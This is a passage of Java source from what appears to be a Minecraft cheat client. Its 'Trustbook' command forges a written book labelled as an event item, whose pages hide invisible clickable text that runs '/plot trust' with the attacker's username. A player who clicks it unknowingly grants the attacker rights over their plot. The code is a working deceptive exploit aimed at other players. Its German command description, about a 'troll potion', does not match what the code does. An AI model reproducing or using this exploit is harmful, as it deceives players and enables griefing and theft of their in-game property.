...
public class Trustbook extends Command {
    public Trustbook() {
        super("tb", "Trustbook", "Gibe dir eine Troll Potion mit dem Command: TrollPotion");
    }
    ...
    public void onCommand(String command, String[] args) {
        if (args.length == 1) {
            ...
            base.setString("author", "§cDropEvent");
            base.setByte("resolved", (byte) 1);
            base.setString("title", "§aEventItem");
            NBTTagList pages = new NBTTagList();
            for (int i = 0; i < 4; i++) {
                pages.appendTag((NBTBase) new NBTTagString("{\"extra\":[\"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\",{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/plot trust " + this.mc.getSession().getUsername() + "\"},\"text\":\"                             \"}],\"text\":\"                             \"}"));
